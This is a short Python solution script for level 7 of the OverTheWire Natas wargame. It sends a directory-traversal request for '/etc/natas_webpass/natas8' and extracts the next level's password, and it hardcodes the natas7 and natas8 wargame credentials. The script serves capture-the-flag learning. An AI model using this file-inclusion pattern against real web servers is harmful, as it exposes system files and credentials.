from bs4 import BeautifulSoup
import requests
import re

def make():
    res = requests.get(url=url,auth=lvl_pass,params=my_params)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)
def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())


lvl_name = 'natas7'
url = f'http://{lvl_name}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr')
my_params={'page':'/etc/natas_webpass/natas8'}


res, soup = make()
writeResponse()
print(re.search(r"[a-zA-Z0-9]{32}",soup.find("div",id="content").text)[0])

'''
Learning both about directory traversal and PHP arguments!

Username: natas8
Password: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB

'''
